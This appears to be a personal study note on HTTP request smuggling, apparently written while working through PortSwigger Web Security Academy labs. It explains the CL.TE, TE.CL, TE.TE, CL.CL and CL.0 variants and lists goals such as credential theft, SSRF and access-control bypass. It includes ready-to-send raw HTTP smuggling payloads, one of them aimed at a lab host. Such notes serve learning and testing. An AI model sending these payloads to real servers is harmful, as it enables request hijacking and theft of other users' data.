# HTTP Request Smuggling





###### notes:
- 	- possible behaviours to use to exploit request smuggling:
		- steal users credentials via post/get request
		- SSRF by bypassing the frontend 
		- bypassing frontend access control
		- turn on-site redirect to open redirect
- - Smuggling  via CRLF occur when the backend treat `\n` as header delimiter and the frontend doesn't.
	- e.g: `Foo: bar\nTransfer-Encoding: chunked`
- request smuggling arise when using both of those headers:
```http
GET / HTTP/1.1
Content-Length: 20
Tranfer-Encoding: chunked
```
- #### when request smuggling arise?
	-   CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
		```
		POST / HTTP/1.1 
		Host: vulnerable-website.com
		Content-Length: 13 
		Transfer-Encoding: chunked 
		
		0
		
		SMUGGLED
		```
	-   TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
		  ```
		  POST / HTTP/1.1 
		  Host: vulnerable-website.com 
		  Content-Length: 3 
		  Transfer-Encoding: chunked 
		  
		  8 
		  SMUGGLED 
		  0
	
		```
	-   TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.![[Transfer-Encoding smuggling.png]]
	- CL.CL: 
	  ![[Request smuggling CE.CE.png]]
  - CL.0: occur when the endpoint doesn't expect POST request, and end the request at last header, by sending two single grouped requests that included arbitrary body


###### payloads for faster investigating:
-  CL.TE
```http
POST / HTTP/1.1
Host: 0ab00093044028c5c0ce443300050094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x


```
- TE.CL
```HTTP
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0


```
- CL.0
```HTTP
POST /vulnerable-endpoint
HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: xGET / HTTP/1.1
Host: vulnerable-website.com


```